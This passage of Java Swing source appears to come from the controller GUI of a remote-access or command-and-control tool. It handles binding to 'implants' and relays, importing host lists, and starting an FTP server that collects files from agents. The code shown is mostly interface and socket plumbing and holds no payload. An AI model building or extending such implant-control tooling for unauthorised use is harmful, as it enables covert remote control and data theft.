		catch(Exception e)
		{
			Drivers.eop(strMyClassName + "'s Action Performed", strMyClassName, e, "", true);
		}
		
		this.validate();
	}
	
	
	
	public boolean disconnectLoggie()
	{
		try
		{
			int indexToRemove = this.jtblLoggieAgents.getSelectedRowIndex();
			
			if(indexToRemove < 0 || indexToRemove > Driver.alLoggingAgents.size())
				return false;
			
			//else, simply starve the thread, and let it kill itself
			Driver.alLoggingAgents.get(indexToRemove).sktMyConnection.close();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("disconnectLoggie", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean updateBeaconingCommandList_GUI()
	{
		try
		{
			this.jpnlBeaconCommands.removeAll();
			jpnlBeaconCommands.setLayout(new GridLayout(Drivers.alBeaconCommands_GUI.size(), 1));
			
			for(int i = 0; i < Drivers.alBeaconCommands_GUI.size(); i++)
			{
				jpnlBeaconCommands.add(Drivers.alBeaconCommands_GUI.get(i));
				Drivers.alBeaconCommands_GUI.get(i).setIndex(i);
			}
			
			this.validate();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("updateBeaconingCommandList_GUI", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	
	public boolean decideConnectionAction(boolean bindToSingleHost)
	{
		try
		{
			String bindingOption = (String)this.jcbBindingOption.getSelectedItem();
			if(bindingOption == null || bindingOption.trim().equals(""))
			{
				Drivers.jop_Error("Please select a valid binding option                   ", "Unable to complete selection action");
				return false;
			}
			
			//otherwise, we have a good selection, check it
			bindingOption = bindingOption.trim();
			
			//determine if binding to multiple hosts
			File fleMultipleHosts = null;
			if(!bindToSingleHost)
			{
				try
				{
					fleMultipleHosts = Driver.querySelectFile(true, "Please Specify IP Address List to Import", JFileChooser.FILES_ONLY, false, false);
					
					if(fleMultipleHosts == null || !fleMultipleHosts.exists() ||  !fleMultipleHosts.isFile())
					{
						Drivers.jop_Error("Invalid or No File Selected", "Action Not Performed");
						return false;
					}					
					
				}
				catch(Exception e)
				{
					fleMultipleHosts = null;
				}
			}
			
			if(bindingOption.equalsIgnoreCase(this.strBindToImplant))
			{
				//bind to multiple agents
				if(fleMultipleHosts != null)
				{
					//return this.DEPRECATED_connectToMultipleHosts(true, false, false, false, fleMultipleHosts);
					
					Thread_ConnectToMultipleHosts connectionThread = new Thread_ConnectToMultipleHosts(fleMultipleHosts, Thread_ConnectToMultipleHosts.bindTo_Implant, Thread_ConnectToMultipleHosts.parentCaller_Controller);
				}
				
				//else bind to single host
				return connectToImplant(true, false, false, false);
			}			
			
			else if(bindingOption.equalsIgnoreCase(this.strBindToController))
			{
				//Driver.myHandShake = Driver.getHandshakeData(Driver.delimeter_1);
				
				//bind to multiple agents
				if(fleMultipleHosts != null)
				{
					//return this.DEPRECATED_connectToMultipleHosts(true, false, false, false, fleMultipleHosts);
					Thread_ConnectToMultipleHosts connectionThread = new Thread_ConnectToMultipleHosts(fleMultipleHosts, Thread_ConnectToMultipleHosts.bindTo_Controller, Thread_ConnectToMultipleHosts.parentCaller_Controller);
				}
				
				//else bind to single host
				return connectToImplant(false, true, false, false);
			}
			
			else if(bindingOption.equalsIgnoreCase(this.strBindToRelay))
			{
				//solo, for now, have the controller configured, even though it is connecting out to a relay, to state it is connecting to another controller 
				//in order to receive the feedback we expect!  it'll take too much to troubleshoot why we are not receiving the echoed commands back in the command terminal
				//bind to multiple agents
				if(fleMultipleHosts != null)
				{
					//return this.DEPRECATED_connectToMultipleHosts(true, false, false, false, fleMultipleHosts);
					Thread_ConnectToMultipleHosts connectionThread = new Thread_ConnectToMultipleHosts(fleMultipleHosts, Thread_ConnectToMultipleHosts.bindTo_Relay, Thread_ConnectToMultipleHosts.parentCaller_Controller);
				}
				
				//else bind to single host
				return connectToImplant(false, true, false, false);
			}
			
			else if(bindingOption.equalsIgnoreCase(this.strBindToCortana))
			{
				Drivers.jop("Unable to Continue. This feature is still under development");
				return false;
				//myHandShake = this.getControllerHandshakeData(Driver.delimeter_1);
				//return connectToImplant(false, false, true, true);
			}
			
			else
			{
				Drivers.jop_Error("Please select a valid binding option                   ", "Unable to complete selection action");
				return false;
			}
			
			//return true;
		}
		catch(Exception e)
		{
			Driver.eop("decideConnectionAction", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean closeFTP()
	{
		try
		{
			
			if(ftpServerSocket.svrSocket != null && ftpServerSocket.FTP_ServerSocket_Is_Open)
			{
				if(Drivers.jop_Confirm("FTP ServerSocket is open on port " + ftpServerSocket.PORT + ".  Do you Wish to close?", "Close FTP ServerSocket") == JOptionPane.YES_OPTION)
				{
					//tell receiver to stop... and die softly...
					ftpServerSocket.continueRun = false;
					ftpServerSocket.FTP_ServerSocket_Is_Open = false;
					
					//notify GUI
					jlblFTP_Status.setText("CLOSED");
										
					try
					{
						ftpServerSocket.dismissClosedSocketError = true;
						ftpServerSocket.svrSocket.close();
					}catch(Exception e){}
					
					return true;
				}				
			
			}
			else
			{
				Drivers.jop_Error("FTP ServerSocket Does not appear to be running.", "Unable to complete action");
				return false;
			}
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("closeFTP", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean establishFTP()
	{
		try
		{
			if(ftpServerSocket.svrSocket != null && ftpServerSocket.FTP_ServerSocket_Is_Open)
			{
				if(Drivers.jop_Confirm("FTP ServerSocket is open on port " + ftpServerSocket.PORT + ".  Do you Wish to close?", "Close FTP ServerSocket") == JOptionPane.YES_OPTION)
				{
					//tell receiver to stop... and die softly...
					ftpServerSocket.continueRun = false;
					ftpServerSocket.FTP_ServerSocket_Is_Open = false;
					ftpServerSocket.dismissClosedSocketError = true;
					try{ftpServerSocket.svrSocket.close();}catch(Exception ee){}
					
					//notify GUI
					jlblFTP_Status.setText("CLOSED");
					jlblFTP_Status.setBackground(Color.red);
					jlblFTP_Status.setForeground(Color.white);
																			
					try
					{
						//ftpServerSocket.svrSocket.close();
					}catch(Exception e){}					
					
				}
				else
				{
					//else, user canceled choosing to terminate FTP receiver thread, get out of here
					return false;
				}
				
				
			}
			
			//otherwise, FTP server not running.  Get it started right meow!
			
			if(Driver.fleFTP_FileHiveDirectory == null || !Driver.fleFTP_FileHiveDirectory.exists() || !Driver.fleFTP_FileHiveDirectory.isDirectory())
			{
				setFTP_FileHiveDirectory();
			}
			
			int port = 21;
			try
			{
				port = Integer.parseInt(this.jtfPort_FTP.getText().trim());
				if(port < 1 || port > 65534)
				{
					throw new Exception("Port is out of range");
				}
				
			}
			catch(Exception ee)
			{
				Drivers.jop_Error("Invalid FTP Port Entered.                       ", "Unable to complete selected action");
				return false;
			}
			
			//otherwise, we have a good port, start the FTP Server!!!
			
			ftpServerSocket = new FTP_ServerSocket(false, true, port, Driver.interfaceBindAddress, this.jlblFTP_Status);
			ftpServerSocket.start();
			
			Driver.FTP_ServerSocket = ftpServerSocket;

			
			return true;
			
		}//end try
		catch(Exception e)
		{
			Drivers.eop("establishFTP", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public static File setFTP_FileHiveDirectory()
	{
		
		
		File fleSelected = null;
		
		try
		{
			File dropDirectory = Driver.querySelectFile(false, "Please Select the Directory to save received files", JFileChooser.DIRECTORIES_ONLY, false, false);
		
			if(dropDirectory != null && dropDirectory.isDirectory() && dropDirectory.exists())
			{
				Driver.fleFTP_FileHiveDirectory = dropDirectory;
				Drivers.sop("FTP FileHive Directory Set to: " + Driver.fleFTP_FileHiveDirectory.getCanonicalPath());
				jbtnFTP_FileHive.setToolTipText("FTP FileHive Directory Set to: " + Driver.fleFTP_FileHiveDirectory.getCanonicalPath());
				try {		Splinter_GUI.jpnlMainController.jbtnOpenFileHive.setToolTipText("FTP FileHive Directory Set to: " + Driver.fleFTP_FileHiveDirectory.getCanonicalPath());}catch(Exception e){}
			}
			
			else
			{
				if(Driver.fleFTP_FileHiveDirectory != null && Driver.fleFTP_FileHiveDirectory.exists() && Driver.fleFTP_FileHiveDirectory.isDirectory())
				{
					Drivers.jop_Error("No FTP Save Location Selected. Reverting to previous location at: \n" + Driver.fleFTP_FileHiveDirectory.getCanonicalPath(), "FTP FileHive Not Selected");
				}
				else
				{
					Drivers.jop_Error("No FTP Save Location Selected", "FTP FileHive Not Selected");
				}
			}
				
			//must ensure we get a good directory!
			if(Driver.fleFTP_FileHiveDirectory == null || !Driver.fleFTP_FileHiveDirectory.exists() || !Driver.fleFTP_FileHiveDirectory.isDirectory())
			{
				return setFTP_FileHiveDirectory();
			}
			
			return Driver.fleFTP_FileHiveDirectory;
		}
		
		catch(Exception e)
		{
			Drivers.eop("setFTP_FileHiveDirectory", "Splinter_GUI", e, e.getLocalizedMessage(), false);
		}
		
		return Driver.fleFTP_FileHiveDirectory;
	}
	
	public boolean displaySelectedImplantOnMap()
	{
		try
		{
			if(Drivers.alTerminals.size() < 1)
			{
				Drivers.jop_Error("There are no implants to display at this time.                         ", "Cannot Complete Selected Action");
				return false;
			}
			
			//get index to show
			int indexToShow = this.jtblConnectedAgents.getSelectedRowIndex();
			
			if(indexToShow < 0)
			{
				Drivers.jop_Error("Please select an implant to display on map.                        ", "Cannot Complete Selected Action");
				return false;
			}
			
			//retrieve thread to remove
			Thread_Terminal threadToDisplay = Drivers.alTerminals.get(indexToShow);
			
			//display self on map!
			threadToDisplay.showMyselfOnMap();
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("displaySelectedImplantOnMap", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	/**
	 * it is ok for preSelectedIndex to be -1. If -1, we will search through jtblConnectedImplants, otherwise, this method could have been invoked by a command terminal class, 
	 * so work on the index selected
	 * @param preSelectedIndex
	 * @return
	 */
	public static boolean disconnectSelectedAgent(int preSelectedIndex)
	{
		try
		{
			if(Drivers.alTerminals.size() < 1)
			{
				Drivers.jop_Error("There are no implants to remove at this time.                         ", "Cannot Disconnect Implant - No Implants Populated");
				return false;
			}
			
			//get index to remove
			int indexToRemove = 0;
					
			//check if we're loading from the default jtblConnectedAgents or if we should look through the preselectedIndex
			if(preSelectedIndex == -2)
			{
				indexToRemove = jtblConnectedAgents.getSelectedRowIndex();
			}
			
			else//otherwise, use the value passed in here
			{
				indexToRemove = preSelectedIndex;
			}
			
			if(indexToRemove < 0)
			{
				Drivers.jop_Error("Please select an implant to remove.                        ", "Cannot Disconnect Implant - No Implant Selected");
				return false;
			}
			
			//retrieve thread to remove
			Thread_Terminal threadToDelete = Drivers.alTerminals.get(indexToRemove);
			
			if(Drivers.jop_Confirm("You have chosen to remove Implant: " + threadToDelete.getJListData() + "\nDo you wish to continue?" , "Confirm Punting Selected Implant") != JOptionPane.YES_OPTION)
			{
				//USER DID NOT SELECT YES, EXIT OUT OF HERE!
				return true;
			}
			
			Drivers.sop("Terminating Thread ID: " + threadToDelete.getThreadID());
			
			if(threadToDelete.myCareOfAddressNode != null)
			{
				//solo, go back and place the parameters over the socket to have this agent removed on the other side in its respective hive
				Drivers.jop_Message("Ah Found it!\nNeed to return and input protocol to remove a Care-Of Address Node.\nPlease Notify Solomon (@Carpenter1010) about this Message.");
				return false;
			}
			
			//chock the thread by closing its socket... it's error handling will call it to be removed from our arraylist
			if(threadToDelete.sktMyConnection != null)//simply try ti close the socket
			{
				try
				{
					threadToDelete.sktMyConnection.close();
					threadToDelete.closeThread();
				}catch(Exception e){}
			}
			
			threadToDelete.continueRun = false;//by simply saying false, the thread will punt out of the while loop and terminate itself
			threadToDelete.killThread = true;
			
			//terminate!
			//Drivers.removeThread(threadToDelete, threadToDelete.getId());
			return true;
		}
		
		catch(Exception e)
		{
			Drivers.eop("disconnectSelectedAgent.", "Splinter_GUI", e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean setTextSize(int index)
	{
		try
		{
			if(index < 1)
				return false;//"Text Size is at the first index
			
			Drivers.fontSize = Integer.parseInt((String)this.jcbFontSize.getSelectedItem());
			
			return true;
		}//end try
		
		catch(Exception e)
		{
			Drivers.fontSize = 12;
			Drivers.eop("setFontSize", Splinter_GUI.class.getName(), e, e.getLocalizedMessage(), false);			
		}
		
		return false;
	}
	
	public boolean setColorScheme(int index)
	{
		try
		{
			switch(index)
			{
				case 0:
				{
					//don't do anything on the first index for it says "Appearance"
					return true;
					//break;
				}
				
				case 1:
				{
					Drivers.clrBackground = Color.black;
					
					Drivers.clrForeground = Color.red;
					Drivers.clrImplant = Color.green;
					
					Drivers.clrController = Color.white;
					
					/*try
					{
						Drivers.txtpne_broadcastMessageBoard.setBackground(Drivers.clrBackground);
						Drivers.jtxtpne_CnslOut.setBackground(Drivers.clrBackground);
						
						Drivers.txtpne_broadcastMessageBoard.validate();
						Drivers.jtxtpne_CnslOut.validate();
					}
					catch(Exception e){}*/
					
					break;
				}
				
								
				case 2:
				{
					Drivers.clrBackground = Color.white;
					
					Drivers.clrForeground = new Color(0, 51, 102);
					Drivers.clrImplant = new Color(0, 51, 102);
					
					Drivers.clrController = Color.black;
					
					/*try
					{
						Drivers.txtpne_broadcastMessageBoard.setBackground(Drivers.clrBackground);
						Drivers.jtxtpne_CnslOut.setBackground(Drivers.clrBackground);
						
						Drivers.txtpne_broadcastMessageBoard.validate();
						Drivers.jtxtpne_CnslOut.validate();
					}
					catch(Exception e){}*/
					
					break;
				}
				
				case 3:
				{
					Drivers.clrBackground = Color.black;
					
					Drivers.clrForeground = Color.green;
					Drivers.clrImplant = Color.white;
					
					Drivers.clrController = Color.yellow;
					
					/*try
					{
						Drivers.txtpne_broadcastMessageBoard.setBackground(Drivers.clrBackground);
						Drivers.jtxtpne_CnslOut.setBackground(Drivers.clrBackground);
						
						Drivers.txtpne_broadcastMessageBoard.validate();
						Drivers.jtxtpne_CnslOut.validate();
					}
					catch(Exception e){}*/
					
					break;
				}
				
				case 4:
				{
					Drivers.clrBackground = Color.white;
					
					Drivers.clrForeground = Color.black;
					Drivers.clrImplant = Color.black;
					
					Drivers.clrController = Color.blue;
					
					/*try
					{
						Drivers.txtpne_broadcastMessageBoard.setBackground(Drivers.clrBackground);
						Drivers.jtxtpne_CnslOut.setBackground(Drivers.clrBackground);
						
						Drivers.txtpne_broadcastMessageBoard.validate();
						Drivers.jtxtpne_CnslOut.validate();
					}
					catch(Exception e){}*/
					
					break;
				}
				
				case 5:
				{
					Drivers.clrBackground = Color.red.darker().darker();
					
					Drivers.clrForeground = Color.white;
					Drivers.clrImplant = Color.white;
					
					Drivers.clrController = Color.yellow;
					
					/*try
					{
						Drivers.txtpne_broadcastMessageBoard.setBackground(Drivers.clrBackground);
						Drivers.jtxtpne_CnslOut.setBackground(Drivers.clrBackground);
						
						Drivers.txtpne_broadcastMessageBoard.validate();
						Drivers.jtxtpne_CnslOut.validate();
					}
					catch(Exception e){}*/
					
					break;
				}
				
				case 6:
				{
					Drivers.clrBackground = Color.black;
					
					Drivers.clrForeground = Color.green;
					Drivers.clrImplant = Color.red;
					
					Drivers.clrController = Color.green;
					
					/*try
					{
						Drivers.txtpne_broadcastMessageBoard.setBackground(Drivers.clrBackground);
						Drivers.jtxtpne_CnslOut.setBackground(Drivers.clrBackground);
						
						Drivers.txtpne_broadcastMessageBoard.validate();
						Drivers.jtxtpne_CnslOut.validate();
					}
					catch(Exception e){}*/
					
					break;
				}
				
				case 7:
				{
					Drivers.clrBackground = Color.blue.darker();
					
					Drivers.clrForeground = Color.white;
					Drivers.clrImplant = Color.white;
					
					Drivers.clrController = Color.yellow;
					
					/*try
					{
						Drivers.txtpne_broadcastMessageBoard.setBackground(Drivers.clrBackground);
						jpnlChatTerminal.txtpne_broadcastMessages.setBackground(Drivers.clrBackground);
						Drivers.jtxtpne_CnslOut.setBackground(Drivers.clrBackground);
						
						Drivers.txtpne_broadcastMessageBoard.validate();
						Drivers.jtxtpne_CnslOut.validate();
					}
					catch(Exception e){}*/
					
					break;
				}
				
			}
			
			try
			{
				Drivers.txtpne_broadcastMessageBoard.setBackground(Drivers.clrBackground);
				Drivers.jtxtpne_CnslOut.setBackground(Drivers.clrBackground);
				jpnlChatTerminal.txtpne_broadcastMessages.setBackground(Drivers.clrBackground);
				
				this.jpnlMainController.jpnlSend.setBackground(Drivers.clrController.darker());
				this.jpnlChatTerminal.jpnlSend.setBackground(Drivers.clrController.darker());
				
				Drivers.txtpne_broadcastMessageBoard.validate();
				Drivers.jtxtpne_CnslOut.validate();
				jpnlChatTerminal.txtpne_broadcastMessages.validate();
				
				
				/*jpnlMainController.jlblSecretMessageMode.setForeground(Drivers.clrBackground);
				jpnlMainController.jlblSecretMessageMode.setBackground(Drivers.clrImplant);
				
				jpnlChatTerminal.jlblSecretMessageMode.setForeground(Drivers.clrBackground);
				jpnlChatTerminal.jlblSecretMessageMode.setBackground(Drivers.clrImplant);*/
			}
			catch(Exception e){}
			
			return true;
		}
		
		catch(Exception e)
		{
			Drivers.eop("setColorScheme", Splinter_GUI.class.getName(), e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	private boolean DEPRECATED_connectToMultipleHosts(boolean connectingToImplant, boolean connectingToController, boolean connectingToRelay, boolean connectToCortana, File fleMultipleHostsList)
	{
		try
		{
			if(fleMultipleHostsList == null || !fleMultipleHostsList.exists() || !fleMultipleHostsList.isFile())
			{
				Driver.jop_Error("Invalid Import File Selected!", "Unable to Continue");
				return false;
			}
			
			//Load the lit, for each line, attempt to connect to the system
			String line = "";
			BufferedReader brIn = new BufferedReader(new FileReader(fleMultipleHostsList));
			String []arrIP_and_Port = null;
			
			while((line = brIn.readLine()) != null)
			{
				try
				{
					arrIP_and_Port = line.trim().split(":");
					jtfIP_Address_To_Implant.setText(arrIP_and_Port[0].trim());
					jtfPort_Address_To_Implant.setText(arrIP_and_Port[1].trim());
					
					//now call the connection function
					connectToImplant(connectingToImplant, connectingToController, connectingToRelay, connectToCortana);
					
				}
				catch(Exception ee)
				{
					Driver.sop("Skipping Invalid line: \"" + line + "\"");
					continue;
				}
			}
			
			//garbage collection
			try {	System.gc();}catch(Exception eee){}
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("connectToMultipleHosts", strMyClassName, e, "", false);
		}
		
		try {	System.gc();}catch(Exception eee){}
		
		return false;
	}
	
	private boolean connectToImplant(boolean connectingToImplant, boolean connectingToController, boolean connectingToRelay, boolean connectToCortana)
	{
		try
		{
			String IP = this.jtfIP_Address_To_Implant.getText();
			
						
			if(IP == null || IP.trim().equals("") /*|| !IP.contains(".")*/)
			{
				Drivers.jop_Error("Invalid IP Address Entered", "Cannot Connect to Implant");
				return false;
			}
			
			if(IP.trim().equalsIgnoreCase("localhost"))
			{
				IP = "127.0.0.1";
			}
			
			//otherwise, at least one octet appears to be present in IP. Harness the info
			/*IP = IP.trim();
			String [] octetArray = IP.split(".");
			
			if(octetArray == null || octetArray.length != 4)
			{
				Drivers.jop_Error("Invalid IP Address Entered", "Cannot Connect to Implant");
				Drivers.jop_Message("IP: " + IP +  " Len: " + octetArray.length);
				return false;
			}*/
			
									
			int PORT = 80;
			
			try
			{
				PORT = Integer.parseInt(this.jtfPort_Address_To_Implant.getText());
				
				if(PORT < 1 || PORT > 65534)
					throw new Exception("Port out of range!");
			}
			catch(Exception e)
			{
				if(e.getLocalizedMessage().equals("Port out of range!"))
					Drivers.jop_Error("Invalid PORT Entered - PORT OUT OF RANGE!!!", "Cannot Connect to Implant");
				
				else
					Drivers.jop_Error("Invalid PORT Entered", "Cannot Connect to Implant");
				
				return false;
			}
			
			//welp from here, attempt to connect to the implant!
			try
			{
				//connect to implant!
				Socket sckClientSocket = new Socket(IP, PORT);
				
				//socket was successful, throw it into a new thread and let it take off from there. if unsuccessful, it would have been handled in the exception below
				Thread_Terminal terminal = new Thread_Terminal(connectingToImplant, connectingToController, connectingToRelay, sckClientSocket);
				terminal.start();				
				
				//"link" the thread to the arraylist
				Drivers.alTerminals.add(terminal);
												
				//update number connected agents
				Drivers.updateConnectedImplants();
				Drivers.jtblConnectedImplants.updateJTable = true;
				
				//fall thru to return true
			}
			catch(Exception e)
			{
				Drivers.jop_Error("Unable to connect to client at " + IP + ":" + PORT, "Error Binding to Target");
				return false;
			}
			
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("connectToImplant", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	private boolean establishServerSocket()
	{
		try
		{
			int newPort = -1;
			
			try
			{
				newPort = Integer.parseInt(this.jtfServerSocketPort.getText().trim());
			}
			catch(Exception e)
			{
				Drivers.jop_Error("Invalid ServerSocket Port Number", "Unable to establish ServerSocket");
				return false;
			}
			
			if(newPort < 1 || newPort > 65534)
			{
				Drivers.sop("Seriously, you try to connect to a port that is out of range?  Tisk. * * shakes head * * Good try tho ;-)");
				Drivers.jop_Error("Unable to start ServerSocket.  Socket Port is out of range!!!", "Can not Start ServerSocket");				
				return false;
			}
			
			Driver.interfaceBindAddress = null;
			//
			//Get Network Interface IP
			//
			try
			{
				int interfaceIndex = this.jcbNetworkInterface.getSelectedIndex();
				
				if(interfaceIndex < 0 || jcbNetworkInterface.getItemCount() < 1)
				{
					Drivers.jop("Unable to continue until a valid network interface is selected.");
					return false;
				}
				
				//
				//otherwise, we have a valid selected component, grab the interface address
				//
				Driver.interfaceBindAddress = MapNetworkInterface.getInterfaceAddress(interfaceIndex);
								
			}
			catch(Exception e)
			{
				Drivers.jop("Unable to continue until a valid network interface is selected.");
				return false;
			}
			
			if(thdServerSocket == null)
			{							
				//else, data is good, establish the serversocket						
				thdServerSocket = new Thread_ServerSocket(newPort, Driver.interfaceBindAddress, this.jlblServerSocketStatus, this.jlblEstablishedPort, this.jlblNumberConnectedImplants, jlblLHOST_ME_IP);
				thdServerSocket.start();//START THE THREAD YEAH MAN!
			}
			else if(thdServerSocket != null && thdServerSocket.serverSocketRunning )
			{
				if(Drivers.jop_Confirm("ServerSocket is already established on port: " + thdServerSocket.svrSocketPort + ".\nDo you wish to close that port and re-establish the server on port " + newPort + "?", "Re-establish ServerSocket?") != JOptionPane.YES_OPTION)
				{
					//exit. leave things in place how they currently are
					return false;
				}
				
				//otherwise, fall thru
				Drivers.sop("User chose to continue.  Re-establishing ServerSocket on port " + newPort);
				
				//else, data is good, establish the serversocket
				try{	thdServerSocket.svrSocket.close();}	catch(Exception e){}				
				
				thdServerSocket = new Thread_ServerSocket(newPort, Driver.interfaceBindAddress, this.jlblServerSocketStatus, this.jlblEstablishedPort, this.jlblNumberConnectedImplants, jlblLHOST_ME_IP);	
				thdServerSocket.start();//START THE THREAD YEAH MAN!
			}
			
			else if(thdServerSocket != null && Drivers.jop_Confirm("An instance of the ServerSocket thread has been initialized. \nIt might not be running however.  \n\nDo you wish to re-initialize the ServerSocket", "Re-Initialize ServerSocket Thread") == JOptionPane.YES_OPTION)
			{
				Drivers.sop("User chose to continue.  Re-establishing ServerSocket on port " + newPort);
				
				//else, data is good, establish the serversocket
				try{	thdServerSocket.svrSocket.close();}	catch(Exception e){}
				
				thdServerSocket = new Thread_ServerSocket(newPort, Driver.interfaceBindAddress, this.jlblServerSocketStatus, this.jlblEstablishedPort, this.jlblNumberConnectedImplants, jlblLHOST_ME_IP);	
				thdServerSocket.start();//START THE THREAD YEAH MAN!
			}
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("establishServerSocket", strMyClassName, e, "", true);
		}
		
		return false;
	}
	
	
	
	
	
	
	public void initializeSettings()
	{
		try
		{
			
				
				
				
			Driver.controller_is_running = true;
			
			JLabel lblServerSocket = new JLabel("Server Socket:");
			lblServerSocket.setBounds(10, 35, 100, 14);
			
			//jpnlServerSocket.setLayout(null);
			//jlblEstablishServerSocket.setBounds(5, 9, 152, 14);
			jpnlServerSocket.add(jlblEstablishServerSocket );
			jpnlServerSocket.add(jtfServerSocketPort );
			jbtnEstablishServerSocket  = new JButton("         Establish ServerSocket       ");
			//jbtnEstablishServerSocket.setBounds(269, 5, 141, 23);
			jpnlServerSocket.add(jbtnEstablishServerSocket );
			//jpnlLayout_ServerSocket.setBounds(86, 23, 695, 37);
			
			jbtnCloseServerSocket  = new JButton("          Close ServerSocket        ");
			//jbtnEstablishServerSocket.setBounds(269, 5, 141, 23);
			jpnlServerSocket.add(jbtnCloseServerSocket );
			
			jpnlServerSocket.add(jcbEnableLogging);
			jcbEnableLogging.addActionListener(this);
			//lblImplant.setBounds(41, 83, 69, 14);
			
			//Establish connection to Agent
			jpnlConnectToImplant.add(jlblConnectToImplant_IP );
			jpnlConnectToImplant.add(jtfIP_Address_To_Implant );
			jpnlConnectToImplant.add(jlblConnectToImplant_Port );
			jpnlConnectToImplant.add(jtfPort_Address_To_Implant);
			jbtnBindToImplant = new JButton("Bind to Implant");
			jbtnConnectToController = new JButton("Connect to Controller");
			jbtnBindToImplant.setToolTipText("Click to establish a TCP connection to the implant");
			jbtnConnectToController.setToolTipText("Use this option to connect to another controller for the Chat to work properly");
			jpnlConnectToImplant.add(jbtnBindToImplant);
			jpnlConnectToImplant.add(jbtnConnectToController);
			
			jcbBindingOption = new JComboBox(this.arrBindingOptions);
			//jbtnBindToHost = new JButton("           Bind          ");
			jbtnBindToSingleHost = new JButton("Bind to Single Host");
			jbtnBindToMultipleHosts = new JButton("Bind to Multiple Hosts");
			
			//jpnlConnectToImplant.add(this.jlblBindingOption);
			jpnlConnectToImplant.add(this.jcbBindingOption);
			jpnlConnectToImplant.add(this.jbtnBindToSingleHost);
			jpnlConnectToImplant.add(this.jbtnBindToMultipleHosts);
			jbtnBindToSingleHost.addActionListener(this);
			jbtnBindToMultipleHosts.addActionListener(this);
			
			jbtnBindToImplant.addActionListener(this);
			jbtnConnectToController.addActionListener(this);
			
			jbtnEstablishServerSocket.addActionListener(this);
			
			jbtnCloseServerSocket.addActionListener(this);
			
			
			jbtnConnectToController.setVisible(false);
			this.jbtnBindToImplant.setVisible(false);
			
			
		}
		catch(Exception e)
		{
			Drivers.eop("initializeSettings", strMyClassName, e, "", true);
		}
	}
	
	public void initializeJTabbedPane()
	{
		try
		{
			
			//initialize main jtabbedpane
			tabbedPane_Main = new JTabbedPane(JTabbedPane.TOP);
			tabbedPane_Main.setBounds(10, 35, 1006, 520);
			
			tabbedPane_IMPLANTS = new JTabbedPane(JTabbedPane.LEFT);
			
			//initialize Settings Tab
			initializeSettings();
			
			//initialize jtable to display connected agent info
			initializeConnectedAgentsColNames();
//jtblConnectedAgents = new JTable_Solomon(Drivers.vctJTableConnectedAgentsColNames, Drivers.vctJTableConnectedAgentsToolTips);
			
//tabbedPane_Main.addTab("Connected Agents", this.jtblConnectedAgents);
			
			
			/*****************************
			 * CONNECTION LABELS
			 ****************************/
			jcbAppearance = new JComboBox();
			jcbAppearance.setModel(new DefaultComboBoxModel(new String[] {"Appearance", "1337", "Bwwwallllzzzz", "Solo", "Nick", "MullinsFTW", "Neo", "DOS"}));
			//jcbAppearance.setBounds(899, 11, 117, 20);
			//jpnlMain.add(jcbAppearance);
			
			this.jcbFontSize = new JComboBox();
			this.jcbFontSize.setModel(new DefaultComboBoxModel(arrTextSizes));
			
			/**********************************************************
			 * CONNECTION STATUS
			 *********************************************************/
			
			jpnlConnectionStatus.setBounds(10, 11, 984, 30);
			
			jpnlConnectionStatus.add(jlblServerSocketStatus_text );
			jpnlConnectionStatus.add(jlblServerSocketStatus );
			jpnlConnectionStatus.add(jlblEstablishedPort_text );
			jpnlConnectionStatus.add(jlblEstablishedPort );
			jpnlConnectionStatus.add(jlblNumberConnectedImplants_Text );
			jpnlConnectionStatus.add(jlblNumberConnectedImplants);

			jpnlConnectionStatus.add(jlblLHOST_ME_IP_Text);
			jpnlConnectionStatus.add(jlblLHOST_ME_IP);
			
			
			jlblServerSocketStatus.setOpaque(true);
			jlblEstablishedPort.setOpaque(true);
			jlblNumberConnectedImplants.setOpaque(true);
			jlblLHOST_ME_IP.setOpaque(true);

			
			/*jpnlConnectionStatus.add(this.jlblCurrentTime);
			jpnlConnectionStatus.add(this.jlblZuluTime);*/
			
			
			Drivers.jlblNumImplantsConnected = jlblNumberConnectedImplants; 
			
			//jpnlMain.add(jpnlConnectionStatus);
//getContentPane().add(BorderLayout.SOUTH, jpnlConnectionStatus); //2013-02-07 solo edit
			
//jpnlSouth.add(jpnlConnectionStatus);
			
			this.jpnlNorth.add(BorderLayout.NORTH, jpnlConnectionStatus);
			
			JPanel jpnlTime = new JPanel(new BorderLayout());
			jpnlTime.add(BorderLayout.WEST, this.jlblCurrentTime);
			jpnlTime.add(BorderLayout.EAST, this.jlblZuluTime);
			
			jlblCurrentTime.setFont(new Font("Courier", Font.BOLD, 20));
			jlblZuluTime.setFont(new Font("Courier", Font.BOLD, 20));
			
			this.jpnlNorth.add(BorderLayout.CENTER, jpnlTime);
			
			//this.add(BorderLayout.NORTH, jpnlNorth);
			jpnlHeading.add(BorderLayout.CENTER, this.jpnlNorth);
			getContentPane().add(BorderLayout.NORTH, jpnlHeading);
			
			getContentPane().add(BorderLayout.SOUTH,jpnlSouth );
			
			jpnlNetworkInterface.add(jlblSelectNetworkInterface);
			jpnlNetworkInterface.add(jcbNetworkInterface);
			jpnlNetworkInterface.add(jbtnRefreshNetworkInterfaceList);
			jbtnRefreshNetworkInterfaceList.addActionListener(this);
				jpnlConnectionStatus_4.add(BorderLayout.WEST, jpnlNetworkInterface);
			
			
			/**********************************************************
			 * HEAP SIZE
			 *********************************************************/
			
			jpnlHeapSize.add(jlblUpTime_Text);
			jpnlHeapSize.add(jlblUpTime);
//			jpnlHeapSize.add(jlblUptime_Days);						jpnlHeapSize.add(new JLabel(":"));
//			jpnlHeapSize.add(jlblUptime_Hours);						jpnlHeapSize.add(new JLabel(":"));
